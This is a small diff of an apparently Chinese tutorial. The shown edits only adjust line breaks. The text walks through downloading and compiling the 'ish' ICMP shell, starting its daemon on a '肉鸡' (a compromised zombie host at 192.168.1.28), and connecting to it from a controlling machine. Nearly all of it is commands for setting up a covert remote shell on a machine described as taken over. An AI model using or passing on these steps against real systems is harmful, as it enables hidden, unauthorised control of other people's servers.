@@ -19,14 +19,11 @@ wget http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz<br>
 tar -zxvf ish-v0.2.tar.gz<br>
 cd ISHELL-v0.2/<br>
 make && make linux<br>
-make linux<br><br>
-
+make linux<br>
 肉鸡192.168.1.28上执行命令：<br>
-./ishd -i 555 -t 0 -p 1099 &<br><br>
-
+./ishd -i 555 -t 0 -p 1099 &<br>
 控制机执行：<br>
 ./ish -i 555 -t 0 -p 1099 192.168.1.28<br>
-
 安装之后，需要在被控端服务器执行如下命令：<br>
 ./ishd -i 555 -t 0 -p 1099 &<br>
 -i 指定ID，标识自己的请求<br>
